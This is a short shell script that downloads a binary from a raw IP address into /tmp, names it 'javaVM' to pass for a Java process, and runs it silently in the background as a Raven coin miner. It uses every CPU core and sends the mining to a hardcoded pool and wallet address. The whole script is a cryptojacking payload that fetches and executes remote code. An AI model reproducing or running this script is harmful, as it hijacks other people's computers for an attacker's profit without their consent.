#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -a yespowersugar -o 143.47.231.0:443 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o -p c=RVN -t $(nproc) > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q http://150.136.168.71:80/archxx/yespowersugar -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -a yespowersugar -o 143.47.231.0:443 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o -p c=RVN -t $(nproc) > /dev/null 5>&4 &
fi
